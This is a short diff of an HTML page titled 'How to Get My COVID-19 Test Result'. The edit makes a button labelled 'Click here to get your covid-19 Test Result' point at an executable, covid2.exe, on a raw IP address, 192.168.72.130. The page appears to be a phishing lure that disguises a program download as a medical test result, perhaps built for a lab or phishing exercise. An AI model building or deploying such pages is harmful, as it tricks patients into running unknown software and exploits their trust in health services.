@@ -368,7 +368,7 @@ Patients</p>
         <div class="cell    small-12 medium-12 colbg-  ">
                   <div class="copyblock block   small-width ">
     <h2 class="h1">How to Get My COVID-19 Test Result</h2>
-          <a href="192.168.72.130/covid2.exe" >
+          <a href="https://192.168.72.130/covid2.exe" >
            <button>
              Click here to get your covid-19 Test Result
             </button>
